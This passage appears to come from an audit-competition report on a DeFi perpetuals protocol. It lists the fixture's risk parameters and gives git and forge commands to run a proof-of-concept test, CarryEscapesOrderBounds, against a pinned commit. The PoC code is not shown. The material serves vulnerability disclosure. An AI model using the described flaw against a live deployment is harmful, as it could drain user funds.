The fixture asserts release values: VPI factor 0.01, skew cap 0.4, margins 10/20/300 bps, 500 bps carry, 10 bps liquidation charge with 50% keeper share, 25 bps settlement buffer, 2,500 bps adverse-confidence multiplier, five-second Pyth divergence, and a 60-second order window. It uses local MockPyth and a one-year time warp. LegacyOrderRouterHarness is a test-only subclass; the PoC calls only inherited typed V3 methods. The $1 million tranche amounts are liquidity, not risk overrides.

```bash
git clone https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8
cp CarryEscapesOrderBounds.t.sol packages/perps/test/perps/
cd packages/perps
forge test --match-contract CarryEscapesOrderBoundsTest -vv
```

The existing validation logs the exact debit and balance deltas across two runs. The PoC uses synthetic oracle data, makes no public network calls, and writes no protocol storage directly.
